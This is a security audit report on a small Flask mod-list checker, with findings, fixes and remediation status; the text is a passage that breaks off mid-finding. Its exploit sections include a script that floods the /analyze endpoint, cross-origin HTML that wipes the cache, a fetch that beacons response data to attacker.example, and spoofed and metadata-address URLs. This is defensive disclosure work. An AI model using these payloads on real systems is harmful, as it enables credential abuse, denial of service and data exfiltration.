# Security Review — Whaaaam

**Date:** 2026-09-17

**Scope:** Full static review of the application source, plus dynamic probing of the Flask
app through `app.test_client()` (no external network calls, no state mutated). Traced every
request flow route → CORS layer → handler → `modlist` → `providers` → outbound HTTP → disk
cache. Reviewed `requirements.txt`, `package.json`/`package-lock.json`, the installed
virtualenv, `.env`, `.gitignore`, git history, and `test_compat.py`. Excluded from scope:
`.venv/` and `node_modules/` internals (third-party code), `docs/` images.

**Branch reviewed:** `main` (HEAD `5b06064`, working tree clean)

---

## A. Executive Summary

**Verdict: UNSAFE for any network-reachable deployment.**

Confidence: **High** on the application code — the entire Python and JavaScript surface is
small (≈700 LOC) and was read in full, and every finding below was reproduced against the
running app. Confidence is **Medium** on deployment posture: the repository contains no
Dockerfile, no CI workflow, no systemd unit and no infrastructure-as-code, so how this is
actually served in production could not be verified and is inferred from
`app.run(host="0.0.0.0", ...)` in `web.py:34`.

Whaaaam has **no authentication, no authorization, no user accounts, no sessions, no
cookies and no database.** That is a deliberate and reasonable design for a paste-a-list
utility, and it means the classic categories in an authorization review — IDOR/BOLA,
multi-tenant isolation, privilege escalation, role checks — are *structurally
inapplicable* rather than merely unimplemented. There is no object to own, no tenant to
escape, and no role to escalate into. Those sections of this review are therefore recorded
as N/A with the reasoning, not padded with invented findings.

The real risk profile is different and it is genuine: the application is an **unauthenticated,
unthrottled, internet-facing proxy in front of a credentialed third-party API.** Every
anonymous `POST /analyze` spends the operator's CurseForge API key, consumes an 8-worker
thread pool, and writes attacker-influenced files to local disk — with no cap on how many
URLs a single request may contain and no limit on request body size. A second endpoint,
`POST /clear_cache`, performs a recursive directory delete with no authentication of any
kind, and permissive CORS lets any website on the internet invoke both endpoints from a
visitor's browser against `localhost` or a LAN address. Separately, the virtualenv that
actually runs the app is pinned *behind* `requirements.txt`, so three merged Dependabot
security bumps are not present in the running environment.

What is genuinely good: the frontend is disciplined about untrusted strings, the error
taxonomy in `providers/http.py` is thoughtful, and the secret is correctly kept out of git.

### Top 3 risks

1. **Unauthenticated, unbounded resource and API-key abuse via `POST /analyze` (HIGH)** —
   no auth, no rate limit, no cap on list length, and `MAX_CONTENT_LENGTH` is `None`; one
   anonymous request can force unbounded outbound calls billed to the operator's
   `CF_API_KEY` (`web.py:15-21`, `modlist.py:70-82`).
2. **Unauthenticated destructive endpoint `POST /clear_cache` reachable cross-origin (MEDIUM)** —
   `shutil.rmtree()` behind zero auth and zero CSRF defence, with CORS reflecting any
   origin (`web.py:24-30`, `modlist.py:85-92`, `web.py:7`).
3. **Runtime dependencies are older than the pinned manifest (MEDIUM)** — `requirements.txt`
   pins Flask 3.1.3 / requests 2.33.0 / python-dotenv 1.2.2, but the installed venv runs
   3.1.2 / 2.32.5 / 1.2.1, so the three merged Dependabot bumps are not actually deployed.

### What is done well (so remediation can stay surgical)

- **No DOM XSS sink for third-party data.** Mod names and version strings from the
  CurseForge/Modrinth APIs are written with `textContent`, `document.createElement()` and
  `new Option()` throughout `static/app.js`. The single `innerHTML` assignment
  (`static/app.js:483-486`) is a hardcoded literal `<tr>` of column headers with no
  interpolation. Invariant 9 in `CLAUDE.md` holds as written.
- **CSV formula injection is handled on both interfaces.** `csvCell()`
  (`static/app.js:702-708`) and `csv_cell()` (`main.py:107-112`) both neutralise a leading
  `=`, `+`, `-`, `@`, tab and CR, and the Python side correctly excludes the empty string
  first.
- **External links are `rel="noopener noreferrer"`** (`static/app.js:517`).
- **The secret is not in version control.** `.env` is untracked, listed in `.gitignore:228`,
  and `git log --all -- .env` is empty — it has never been committed.
- **`debug=False`** (`web.py:34`), so Werkzeug's interactive debugger/RCE console is off.
- **The user-supplied URL is never fetched.** Both providers extract only a slug and issue
  requests to a hardcoded `API_BASE`; the pasted URL is not passed to `requests.get()`. This
  is what keeps the weak host check in F-2026-09-17-4 from being a live SSRF today.
- **CurseForge slug is passed as a `params` dict** (`providers/curseforge.py:150`), so it is
  URL-encoded by `requests` and cannot inject into the query string.
- **The retry policy refuses to retry 401/403/404** (`providers/http.py:43-52`), which is
  both a correctness and an availability win.
- **Cache filenames are sanitised** by `safe_name()` (`providers/__init__.py:8-9`), and path
  traversal is not reachable (see D.3 for the residual concern).
- **No `eval`, `exec`, `shell=True`, `subprocess` in the request path, no raw SQL, no
  deserialization of untrusted data, no file upload, no redirect, no template rendering of
  user input.** Grepped and confirmed: the only `subprocess` use is in `test_compat.py:100`
  invoking `node` on a locally generated harness.

---

## A.1 Remediation Status

**Remediated 2026-09-17**, same day, on `main` (working tree; not yet committed).
Deployment posture was confirmed with the operator in answer to D.5: **public
internet, or planned**, so the full remediation was applied rather than the
localhost-only subset.

| ID              | Severity | Title                                                               | Status                  |
| --------------- | -------- | ------------------------------------------------------------------- | ----------------------- |
| F-2026-09-17-1  | HIGH     | Unbounded unauthenticated `/analyze` resource & API-key abuse       | ✅ Fixed                 |
| F-2026-09-17-2  | MEDIUM   | Unauthenticated destructive `/clear_cache`                          | ✅ Fixed (route deleted) |
| F-2026-09-17-3  | MEDIUM   | Permissive CORS reflects any origin on all routes                   | ✅ Fixed (CORS removed)  |
| F-2026-09-17-4  | MEDIUM   | Host allowlist is a substring match, enabling link spoofing         | ✅ Fixed                 |
| F-2026-09-17-5  | MEDIUM   | Installed dependencies older than pinned `requirements.txt`         | ✅ Fixed                 |
| F-2026-09-17-6  | MEDIUM   | Development server bound to `0.0.0.0` as the production entry point | ✅ Fixed                 |
| F-2026-09-17-7  | LOW      | Raw exception text returned to the client                           | ✅ Fixed                 |
| F-2026-09-17-8  | LOW      | Malformed JSON body shapes cause unhandled 500s                     | ✅ Fixed                 |
| F-2026-09-17-9  | LOW      | Unencoded Modrinth slug interpolated into the API URL               | ✅ Fixed                 |
| F-2026-09-17-10 | LOW      | Orphaned npm lockfile with no manifest backing                      | ✅ Fixed (removed)       |
| F-2026-09-17-11 | LOW      | `pipreqs` dev tooling pinned as a runtime dependency                | ✅ Fixed                 |
| F-2026-09-17-12 | LOW      | No security response headers / CSP                                  | ✅ Fixed                 |

Legend: ✅ fixed · ⚙️ in progress · ⏭️ not started

**What landed**

- `web.py` rewritten: `MAX_CONTENT_LENGTH` 256 KB, `MAX_URLS` 200 (`413` past
  either), request-shape validation (`400`, never a `500`), `CORS(app)` deleted,
  `/clear_cache` route deleted, security headers via `@app.after_request`, and
  `app.run()` defaulting to `127.0.0.1` with `HOST`/`PORT` overrides.
- `providers/__init__.py`: `ALLOWED_HOSTS` with exact `.hostname` matching, and
  `canonical_url()`. `modlist.is_valid_mod_url()` now defers to
  `detect_provider()`, so the two host checks cannot disagree again.
- Both providers read the slug from the parsed **path** and return
  `canonical_url(url)`; Modrinth validates the slug against `SLUG_RE` and encodes
  it at the call sites.
- `modlist.fetch_mod_info()` passes `ProviderError`/`ValueError` copy through and
  logs everything else behind a generic sentence.
- Frontend: clear-cache button and its handler removed together (the handler
  would have thrown at script load without the element); `postJSON` now surfaces
  the server's written reason instead of a bare status code.
- Dependencies: venv reinstalled to the pins (Flask 3.1.3, requests 2.33.0,
  python-dotenv 1.2.2); `flask_cors`, `pipreqs` and the unused `python-dateutil`
  dropped from `requirements.txt`; `gunicorn` added; `pipreqs` moved to a new
  `requirements-dev.txt`; `package.json`, `package-lock.json` and `node_modules/`
  deleted.
- `test_web.py` added — 6 checks over input ceilings, host matching,
  canonicalisation, error copy, slug validation, and routes/headers. Makes no
  network request and fails loudly if anything starts making one.
- Docs: `README.md` (deployment section), `CLAUDE.md` (architecture, caching,
  testing, provider checklist), `SECURITY.md` (CORS removed, dev-vs-runtime).

**Verification.** `python test_compat.py` and `python test_web.py` both pass. The
live server was probed with curl: `GET /` carries the CSP and both other headers,
`POST /clear_cache` → `404`, `POST /analyze '[1,2,3]'` → `400` with a sentence,
201 URLs → `413` with a sentence, a spoofed host → refused without a lookup, and
the socket listens on `127.0.0.1:5000` only. A real end-to-end check against
Modrinth still resolves, and a URL carrying `?utm_source=` resolves *and* exports
with the decoration stripped.

**Still outstanding**

- **Rate limiting is deployment-side, by design.** The report originally proposed
  `flask-limiter`; that was not taken, because under `gunicorn -w 4` its
  in-memory storage is per-worker and a "10/minute" limit is really 40/minute.
  The in-app ceilings are per-request and exact; per-caller limiting belongs at
  the reverse proxy, and an nginx `limit_req` block is now documented in
  `README.md`. **This is only effective once that proxy config is actually
  deployed** — until then `/analyze` is still unmetered per caller.
- **`CF_API_KEY` rotation** (INFO item in section C) — operator action, not a
  code change.
- **D.1, D.2, D.4, D.6 remain open.** The cache-path CWD mismatch, the
  unconditional success message, non-atomic cache writes and the unbounded
  concurrency ceiling were out of the agreed scope for this pass. D.2 is now
  partly moot: the HTTP surface of `clear_cache` is gone, so only the CLI reports
  the count, and it already reports it correctly.

---

## B. Endpoint Inventory

> Recorded as reviewed, before remediation. `POST /clear_cache` and the CORS layer
> no longer exist, and `/analyze` now enforces ceilings — see A.1.

**Auth model: there is none.** No login, no session, no cookie, no API key, no middleware,
no decorator, no guard. Every route below is anonymously reachable by anyone who can reach
the port. Grepping for `requireAuth`, `requireAdmin`, `authorize`, `hasPermission`,
`checkPermission`, `policy`, `guard`, `Forbidden`, `AccessDenied`, `@PreAuthorize`,
`isAdmin`, `login_required`, `current_user` returns **zero matches** across the entire
codebase. There is no admin, billing, user, organization, project, file, export, webhook or
settings endpoint — the API surface is four routes wide.

"WS-scoped?" (workspace/tenant scoping) is **N/A** for every row: the application has no
persistent user-owned objects. The only server-side state is a shared, global,
non-user-attributed HTTP response cache on disk.

| Method   | Path                      | Handler                            | Auth     | Authz    | WS-scoped?             | Risk       | Tests      |
| -------- | ------------------------- | ---------------------------------- | -------- | -------- | ---------------------- | ---------- | ---------- |
| GET      | `/`                       | `index` — `web.py:10-12`           | None     | None     | N/A (static page)      | LOW        | ❌ none     |
| **POST** | **`/analyze`**            | **`analyze` — `web.py:15-21`**     | **None** | **None** | **N/A (no objects)**   | **HIGH**   | **❌ none** |
| **POST** | **`/clear_cache`**        | **`clear_cache` — `web.py:24-30`** | **None** | **None** | **N/A (global cache)** | **MEDIUM** | **❌ none** |
| GET      | `/static/<path:filename>` | Flask built-in static              | None     | None     | N/A                    | LOW        | ❌ none     |

Notes on the two risky rows:

- `/analyze` is intended to be public — it is the product. The finding is not that it is
  public but that it is **unmetered while spending a credential**, and that it accepts an
  unbounded request body and an unbounded list.
- `/clear_cache` is **not** clearly intended to be public. It is a maintenance action
  exposed as a button in the UI (`static/app.js:648-659`) and has no counterpart
  justification for anonymous internet access. Compare `main.py:159-160`, where the same
  operation is a local CLI flag (`--clear-cache`) — appropriately scoped there.

Verified dynamically (Flask test client, no auth supplied):

```
POST /clear_cache  Origin: https://evil.example  -> 200 {"message":"Cache cleared.","status":"ok"}
                                                     Access-Control-Allow-Origin: https://evil.example
POST /analyze                                    -> 200  Access-Control-Allow-Origin: *
OPTIONS /clear_cache (preflight, hostile origin) -> 200  Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
app.config["MAX_CONTENT_LENGTH"]                 -> None
```

---

## C. Critical Findings

### F-2026-09-17-1 — HIGH — Unauthenticated `/analyze` allows unbounded resource consumption and third-party API-key abuse

**File:** `web.py:15-21`, `modlist.py:70-82`

```python
# web.py:15
@app.route("/analyze", methods=["POST"])
def analyze():
    data = request.get_json(force=True)
    urls = data.get("urls", [])
    if not urls:
        return jsonify({"error": "No URLs provided"}), 400
    return jsonify(modlist.check_urls(urls))        # no cap on len(urls)
```

```python
# modlist.py:70
def check_urls(urls, max_workers=MAX_WORKERS):
    results = [None] * len(urls)                    # allocated from attacker input
    jobs = {}
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        for i, url in enumerate(urls):
            if is_valid_mod_url(url):
                jobs[pool.submit(fetch_mod_info, url)] = i   # every URL is submitted
```

**Why dangerous:** Four limits that should exist do not. There is **no authentication**, **no
rate limiting**, **no cap on `len(urls)`**, and **no request body size limit** — confirmed:
`app.config["MAX_CONTENT_LENGTH"]` is `None`, so Flask accepts an arbitrarily large body.
Each URL that survives `is_valid_mod_url()` becomes a live request to the CurseForge or
Modrinth API. The CurseForge requests carry `HEADERS = {"x-api-key": API_KEY}`
(`providers/curseforge.py:22`) — **the operator's credential, on every outbound call.**

Four distinct costs are incurred by an anonymous party:

1. **Credential abuse / quota exhaustion.** The attacker does not need the API key; they
   need only the ability to make the server use it. Sustained abuse leads to rate-limiting
   or suspension of the operator's CurseForge key — which takes the whole application down,
   since `providers/curseforge.py:19-20` raises `EnvironmentError` at import time without a
   working key.
2. **Memory.** `[None] * len(urls)` plus one `Future` per URL, all retained in the `jobs`
   dict until every job completes.
3. **Threads and time.** With `retries=3`, `delay=1` and `timeout=10`
   (`providers/http.py:22`), a single URL against an unresponsive upstream occupies a worker
   for up to ~33 seconds. Eight workers are shared by **all concurrent requests** from all
   callers.
4. **Disk.** `cached_fetch()` writes a JSON file per mod per page
   (`providers/curseforge.py:39-40`, `providers/modrinth.py:37-38`) with no quota, so a
   large list of distinct valid mods fills the volume.

**Exploit:** Entirely anonymous, single request, no precondition beyond reaching the port:

```bash
python - <<'PY' > payload.json
import json
# 100k valid-looking CurseForge URLs; each one costs the operator an API call.
print(json.dumps({"urls": [f"https://www.curseforge.com/minecraft/mc-mods/mod-{i}"
                           for i in range(100000)]}))
PY

curl -X POST http://target:5000/analyze \
     -H 'Content-Type: application/json' \
     --data-binary @payload.json
```

The server allocates a 100,000-element list, queues 100,000 futures, and begins issuing
100,000 API-key-authenticated requests to CurseForge. Repeating this from a handful of
connections is sufficient to exhaust memory or get the key throttled. Note the attack does
not even require valid mod slugs — the search endpoint is called regardless, and a miss
still costs a request.

**Fix:** Defence in depth, cheapest first.

1. Cap the list and the body. In `web.py`:
   ```python
   app.config["MAX_CONTENT_LENGTH"] = 256 * 1024   # 256 KB is generous for a URL list

   MAX_URLS = 200
   ...
   if not isinstance(urls, list) or not all(isinstance(u, str) for u in urls):
       return jsonify({"error": "Send a list of URLs."}), 400
   if len(urls) > MAX_URLS:
       return jsonify({"error": f"Check at most {MAX_URLS} mods at a time."}), 413
   ```
   Keep the message in the project's voice per the Interface Vocabulary table in
   `CLAUDE.md` — "check", not "analyze".
2. Add per-IP rate limiting (`flask-limiter`), e.g. `10/minute` on `/analyze`.
3. Put the deployment behind a reverse proxy that enforces body size and connection limits
   independently of the application.

**Regression test:** Add `test_web.py` using `app.test_client()`:
`POST /analyze` with `{"urls": ["…"] * (MAX_URLS + 1)}` asserts `413` and asserts
`modlist.check_urls` was never called (monkeypatch it to raise); a body larger than
`MAX_CONTENT_LENGTH` asserts `413`; `{"urls": ["https://modrinth.com/mod/sodium"]}` still
asserts `200`.

---

### F-2026-09-17-2 — MEDIUM — `POST /clear_cache` performs a recursive delete with no authentication and no CSRF defence

**File:** `web.py:24-30`, `modlist.py:85-92`

```python
# web.py:24
@app.route("/clear_cache", methods=["POST"])
def clear_cache():
    try:
        modlist.clear_cache()                      # no auth check of any kind
        return jsonify({"status": "ok", "message": "Cache cleared."})
```

```python
# modlist.py:85
def clear_cache():
    if not os.path.isdir(CACHE_ROOT):
        return 0
    ...
    shutil.rmtree(CACHE_ROOT)                      # recursive delete
    os.makedirs(CACHE_ROOT, exist_ok=True)
```

**Why dangerous:** This is a state-changing, destructive, *unauthenticated* endpoint. It is
the only write operation the API exposes and it has no guard whatsoever. Because there is no
session or token, there is nothing to forge — any cross-origin `POST` succeeds, and the
permissive CORS policy (F-2026-09-17-3) means a page can even read the response.

The blast radius is bounded by the fact that `CACHE_ROOT` is a fixed, `__file__`-derived
absolute path (`modlist.py:16`) and is **not influenced by user input** — I verified there is
no path-traversal route into `rmtree()`. So this destroys cache, not source. The impact is
availability and cost, not data loss: wiping the cache forces every subsequent check to
re-fetch from CurseForge, which converts this into a **force-multiplier for
F-2026-09-17-1** — clear the cache, then submit a large list, and every entry is guaranteed
to cost a live API call.

**Exploit:** Any website the operator visits can silently run this against a local or LAN
instance. No CSRF token to obtain, no credentials needed, and `no-cors` is not even
necessary:

```html
<!-- hosted on any domain; fires when the operator loads the page -->
<script>
  setInterval(() => fetch("http://localhost:5000/clear_cache", {method: "POST"}), 1000);
</script>
```

Confirmed against the running app: `POST /clear_cache` with `Origin: https://evil.example`
and no credentials returns `200 {"status":"ok"}`.

**Fix:** Decide whether this is an operator action or a user action.

- **Preferred:** it is an operator action — remove the HTTP route entirely and keep
  `main.py --clear-cache` (`main.py:159-160, 167-172`), which is already the correct
  local-only affordance. Drop the button at `static/app.js:648-659` and its markup.
- **If the button must stay:** require a shared secret from the environment
  (`X-Admin-Token` compared with `hmac.compare_digest`), bind the app to `127.0.0.1`
  (F-2026-09-17-6), and restrict CORS (F-2026-09-17-3) so a foreign page cannot invoke it.

**Regression test:** `POST /clear_cache` with no token asserts `403` and asserts
`modlist.clear_cache` was not called (monkeypatch it to raise); with the correct token
asserts `200`. If the route is removed instead, assert `POST /clear_cache` returns `404`.

---

### F-2026-09-17-3 — MEDIUM — CORS reflects any origin and allows all methods on every route

**File:** `web.py:7`

```python
from flask_cors import CORS
app = Flask(__name__, static_folder="static", template_folder="templates")
CORS(app)                                          # no origins=, no resources=, no methods=
```

**Why dangerous:** `CORS(app)` with no arguments applies the most permissive policy
flask-cors offers to **every** route. Verified against the running app:

```
OPTIONS /clear_cache  Origin: https://evil.example
  -> 200
     Access-Control-Allow-Origin: https://evil.example
     Access-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
```

The origin is **reflected**, not restricted, and methods the app does not implement
(`DELETE`, `PUT`, `PATCH`) are advertised as allowed.

Two honest qualifications, because this is frequently over-rated: there are no cookies and
no auth, so this does **not** leak authenticated data and it is **not** classic CSRF —
`fetch()` could reach these endpoints without CORS anyway, since CORS restricts *reading
responses*, not *sending requests*. What the policy actually grants an attacker is the
ability to **read the response** cross-origin, which turns a blind request into a working
oracle: a malicious page can enumerate what a victim's local instance can reach and read the
`/analyze` output, and can confirm that `/clear_cache` succeeded. Combined with the app
binding `0.0.0.0` (F-2026-09-17-6), any site a user on the LAN visits can probe and drive
the instance and observe results.

**Exploit:**

```html
<script>
fetch("http://localhost:5000/analyze", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({urls: ["https://modrinth.com/mod/sodium"]})
}).then(r => r.json())
  .then(d => navigator.sendBeacon("https://attacker.example/collect", JSON.stringify(d)));
// Response is readable because Access-Control-Allow-Origin is reflected.
</script>
```

**Fix:** Scope the policy to the routes and origins that need it. If the page and the API are
same-origin — which they are, `static/app.js:624` calls the relative path `/analyze` — CORS
is **not needed at all** and the cleanest fix is to delete `CORS(app)` and the `flask_cors`
dependency. If a separately-hosted frontend is planned, be explicit:

```python
CORS(app, resources={r"/analyze": {"origins": ["https://whaaaam.example"]}},
     methods=["POST"])
```

**Regression test:** `OPTIONS /analyze` with `Origin: https://evil.example` asserts the
response has no `Access-Control-Allow-Origin` header (or one not equal to the hostile
origin); with an allowed origin asserts the header matches exactly.

---

### F-2026-09-17-4 — MEDIUM — Host allowlist is a substring match, permitting attacker-controlled domains and link spoofing

**File:** `modlist.py:21-29`, `providers/__init__.py:31-39`, `static/app.js:512-518`

```python
# modlist.py:21
def is_valid_mod_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        return False
    host = parsed.netloc.lower()
    return "curseforge.com" in host or "modrinth.com" in host   # substring, not host match
```

**Why dangerous:** `"curseforge.com" in host` is a substring test against the whole netloc,
which includes userinfo and any suffix. `detect_provider()` is looser still — it tests the
substring against the **entire URL**, so a query string or path can select the provider.
Confirmed:

```
'https://www.curseforge.com/minecraft/mc-mods/jei'        -> True   (intended)
'http://curseforge.com@169.254.169.254/latest/meta-data/' -> True   (userinfo trick)
'https://curseforge.com.attacker.example/x'               -> True   (suffix trick)
```

**This is not a live SSRF, and I want to be precise about why:** neither provider ever
fetches the pasted URL. `providers/curseforge.py:145` takes only the last path segment as a
slug and requests a hardcoded `API_BASE`; `providers/modrinth.py:57-62` does the same. The
`169.254.169.254` case above is therefore *not* contacted today. What this is, is a broken
trust boundary one code change away from being SSRF — the moment anyone fetches a favicon,
follows a redirect, or adds a provider that requests the user's URL, this becomes cloud
metadata access with no further bug required.

There is a **working impact today**, in the frontend. `providers/curseforge.py:174` echoes
the attacker's URL back verbatim as `"url": url`, and `static/app.js:512-518` renders it as
the `href` of a link **whose visible text is the real mod's name** resolved from the
legitimate API:

```javascript
// static/app.js:512
if (mod.url) {
  const a = document.createElement("a");
  a.href = mod.url;                 // attacker-controlled origin
  a.textContent = mod.name || "Unknown";   // authentic name from CurseForge
```

So `https://curseforge.com.attacker.example/minecraft/mc-mods/jei` resolves the genuine "Just
Enough Items (JEI)" via the real API and renders a link reading **Just Enough Items (JEI)**
that points at `curseforge.com.attacker.example`. The same URL is carried into the Markdown
and CSV exports (`static/app.js:690, 721`; `main.py:101, 127`), so a crafted list shared with
another person — the natural use of this tool — produces an export full of trusted mod names
pointing at attacker domains. The `javascript:` scheme is correctly blocked by the scheme
check, so this is link spoofing, not XSS.

**Exploit:** Attacker publishes a modpack list containing
`https://curseforge.com.attacker.example/minecraft/mc-mods/jei` alongside genuine URLs. The
victim pastes the list, sees every mod resolve with correct names and versions, and clicks
through to a page serving a trojaned jar.

**Fix:** Match the host exactly, against a registrable-domain allowlist, and use
`parsed.hostname` (which excludes userinfo and port) rather than `netloc`:

```python
ALLOWED_HOSTS = {"curseforge.com", "www.curseforge.com",
                 "modrinth.com", "www.modrinth.com"}

def is_valid_mod_url(url):
    try:
        parsed = urlparse(url)
    except ValueError:
        return False
    return (parsed.scheme in ("http", "https")
            and (parsed.hostname or "").lower() in ALLOWED_HOSTS)
```

Apply the same exact-host logic in `detect_provider()` (`providers/__init__.py:31-39`) so
provider selection cannot be driven by a query string. Then, in both providers, return the
**canonical** URL rebuilt from the resolved slug rather than echoing the user's input —
`f"https://www.curseforge.com/minecraft/mc-mods/{slug}"` — which closes the link-spoofing
path at the source and is the more robust fix.

**Regression test:** Parameterised assertions that `is_valid_mod_url` and `detect_provider`
reject `http://curseforge.com@169.254.169.254/`, `https://curseforge.com.attacker.example/x`,
`https://evil.example/?ref=modrinth.com` and `https://modrinth.com.evil.example/mod/x`, while
accepting the four legitimate host forms. Plus: assert `get_mod_data()` returns a `url` on an
allowlisted host regardless of the input host.

---

### F-2026-09-17-5 — MEDIUM — The running virtualenv is older than the pinned manifest, so merged security bumps are not deployed

**File:** `requirements.txt:1-4` vs. the installed environment

```
requirements.txt        installed in .venv        delta
Flask==3.1.3            Flask 3.1.2               behind
Requests==2.33.0        requests 2.32.5           behind
python-dotenv==1.2.2    python-dotenv 1.2.1       behind
```

**Why dangerous:** The three most recent commits on `main` are Dependabot bumps —
`5b06064` (flask 3.1.2→3.1.3), `59e5c72` (requests 2.32.5→2.33.0), `292b2bb`
(python-dotenv 1.2.1→1.2.2). They updated `requirements.txt` but the environment that
actually runs the application was never reinstalled, so it is running **exactly the versions
those PRs were raised to replace.** A green `python test_compat.py` says nothing about this:
the test suite never imports Flask and never asserts a version. This is precisely the case
where "tests pass" and "is patched" diverge.

I have not attempted to verify which specific CVEs, if any, those three releases address —
that requires advisory lookups outside this review's read-only scope, and I will not
speculate. The finding stands on the process failure regardless: **the manifest and the
runtime disagree, and nothing in the repository detects that.**

**Exploit:** Not directly exploitable by itself. It is an exposure-window issue: any
vulnerability fixed in Flask 3.1.3, requests 2.33.0 or python-dotenv 1.2.2 remains live in
the deployed environment while the repository claims otherwise.

**Fix:**

```bash
.venv/bin/pip install -r requirements.txt --upgrade
.venv/bin/pip check
```

Then prevent recurrence: generate a hash-pinned lockfile (`pip-compile --generate-hashes`,
or `uv pip compile`), install with `--require-hashes` in deployment, and add a CI step that
fails when `pip freeze` diverges from the manifest. Note there is currently **no CI at all**
(no `.github/` directory exists) despite Dependabot raising PRs, so nothing verifies a bump
before or after merge.

**Regression test:** A CI job running `pip install -r requirements.txt` followed by
`pip check` and a `pip freeze` diff against the manifest, failing the build on drift.

---

### F-2026-09-17-6 — MEDIUM — Werkzeug development server bound to all interfaces as the production entry point

**File:** `web.py:33-34`

```python
if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=False, threaded=True)
```

**Why dangerous:** `app.run()` starts Werkzeug's **development** server, which its own
documentation states is not suitable for production: no request-size limits, no slow-client
protection (trivially held open by Slowloris-style connections), no process supervision, no
graceful restart, and a thread-per-connection model with no bound. `host="0.0.0.0"` binds
every interface, exposing it to the entire LAN — and, if the host is internet-facing or
port-forwarded, to the internet. This is the amplifier that turns findings 1, 2 and 3 from
"local tool quirks" into remotely reachable issues.

`debug=False` is correct and important — it means the Werkzeug debugger console (an
unauthenticated RCE primitive) is **not** exposed. Credit where due; this is the single most
dangerous version of this mistake and it was avoided.

Because the repository contains no Dockerfile, no CI workflow, no systemd unit and no
infrastructure-as-code, I cannot confirm how the app is served in production. If a proper
WSGI server already fronts it, this finding reduces to LOW and the `__main__` block is merely
a footgun for contributors following `README.md` / `CLAUDE.md`, both of which instruct
`python web.py`.

**Exploit:** Anyone on the same network segment reaches
`http://<host>:5000/analyze` and `http://<host>:5000/clear_cache` with no credentials — see
F-2026-09-17-1 and F-2026-09-17-2 for what that buys them.

**Fix:** Default the development entry point to loopback and document the production path:

```python
if __name__ == "__main__":
    app.run(host=os.getenv("HOST", "127.0.0.1"),
            port=int(os.getenv("PORT", 5000)), debug=False, threaded=True)
```

For deployment, run under a real WSGI server behind a reverse proxy that terminates TLS and
enforces body-size and connection limits:
`gunicorn -w 4 -b 127.0.0.1:5000 --timeout 60 --limit-request-line 8190 web:app`.
Add `gunicorn` to `requirements.txt` and update the run instructions in `README.md` and both
`CLAUDE.md` files, which currently present `python web.py` as the recommended way to serve.

**Regression test:** Not unit-testable. Cover with a deployment checklist item and a smoke
check asserting the production process is not Werkzeug (e.g. the `Server:` response header is
not `Werkzeug/*`).

---

### F-2026-09-17-7 — LOW — Raw exception text is returned to the client

**File:** `modlist.py:51-52`, `web.py:29-30`

```python
# modlist.py:51 — any exception at all becomes the user-facing reason
    except Exception as exc:
        return {"url": url, "error": str(exc)}
```

```python
# web.py:29
    except Exception as exc:
        return jsonify({"status": "error", "message": str(exc)}), 500
```

**Why dangerous:** `providers/http.py` goes to real trouble to produce curated, non-leaky
messages (`ProviderError`, `providers/http.py:17-18, 46-57`), but these two handlers catch
**every** exception and stringify it, which discards that discipline for any failure that is
not a `ProviderError`. An `OSError` from the cache write path
(`providers/curseforge.py:39`, `providers/modrinth.py:37`) stringifies with the **absolute
filesystem path**:

```
[Errno 28] No space left on device: '/home/lordznc/Lab/Whaaaam/cache/curseforge/jei_238222/page-0.json'
```

That is returned in the JSON response and rendered verbatim in the results table
(`static/app.js:572`) and in exports. It discloses the deployment path, the username, and the
internal cache layout. A `JSONDecodeError` from a malformed upstream response similarly leaks
raw response fragments. This also violates the project's own documented error contract in
`CLAUDE.md` ("Error copy names what happened and what remains possible. It never exposes an
internal API URL, a provider id, or a bare HTTP status as the message").

**Exploit:** Low-effort information disclosure. An attacker submits URLs while the disk is
full, or simply during any transient internal error, and reads deployment paths out of the
normal response body. No special access required.

**Fix:** Let curated errors through; make everything else generic, and log the detail
server-side:

```python
from providers.http import ProviderError

    except ProviderError as exc:
        return {"url": url, "error": str(exc)}          # already user-facing
    except ValueError as exc:
        return {"url": url, "error": str(exc)}          # "No mod called 'x' on CurseForge"
    except Exception:
        app.logger.exception("check failed for %s", url)
        return {"url": url, "error": "This mod could not be checked right now"}
```

Apply the same split in `web.py:29-30`. Ensure the log sink is not the HTTP response and that
`CF_API_KEY` is never logged — it is currently only ever placed in a request header, which is
correct; keep it that way.

**Regression test:** Monkeypatch `providers.curseforge.get_mod_data` to raise
`OSError("[Errno 28] No space left on device: '/srv/secret/path'")`; assert the response
`error` string does not contain `/srv/` and matches the generic copy.

---

### F-2026-09-17-8 — LOW — Malformed JSON body shapes cause unhandled 500s

**File:** `web.py:17-21`

```python
    data = request.get_json(force=True)
    urls = data.get("urls", [])         # AttributeError if body is a list or string
    ...
    return jsonify(modlist.check_urls(urls))   # TypeError if urls has no len()
```

**Why dangerous:** `/analyze` validates that `urls` is *truthy* but never that it is a list
of strings, and `data` is never checked to be a dict. Confirmed against the running app:

```
POST /analyze  [1,2,3]                -> 500   (AttributeError: 'list' has no 'get')
POST /analyze  "hello"                -> 500   (AttributeError: 'str' has no 'get')
POST /analyze  {"urls": 5}            -> 500   (TypeError: object of type 'int' has no len())
POST /analyze  {"urls": {"a":"b"}}    -> 200   (iterates dict keys — silently wrong)
```

Unhandled 500s on trivially malformed input are a robustness and log-noise problem, and each
one is an unlogged stack trace path. The last row is the more interesting one: a dict is
accepted and its *keys* are iterated, so the endpoint silently processes something the client
never meant to send. `force=True` also means the body is parsed regardless of `Content-Type`,
widening what reaches this code. With `debug=False` no traceback is returned to the client,
which limits this to a robustness finding rather than disclosure.

**Exploit:** `curl -X POST http://target:5000/analyze -d '[1,2,3]' -H 'Content-Type: application/json'`
returns 500. Cheap to automate for log flooding; not otherwise damaging.

**Fix:** Validate the shape explicitly — this folds into the same guard as
F-2026-09-17-1:

```python
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return jsonify({"error": "Send a JSON object with a list of URLs."}), 400
    urls = data.get("urls")
    if not isinstance(urls, list) or not all(isinstance(u, str) for u in urls):
        return jsonify({"error": "Send a list of URLs."}), 400
    if not urls:
        return jsonify({"error": "No URLs provided"}), 400
```

Note `silent=True` so a body that is not valid JSON also returns the curated 400 rather than
Werkzeug's default.

**Regression test:** Parameterised: each of `[1,2,3]`, `"hello"`, `{"urls": 5}`,
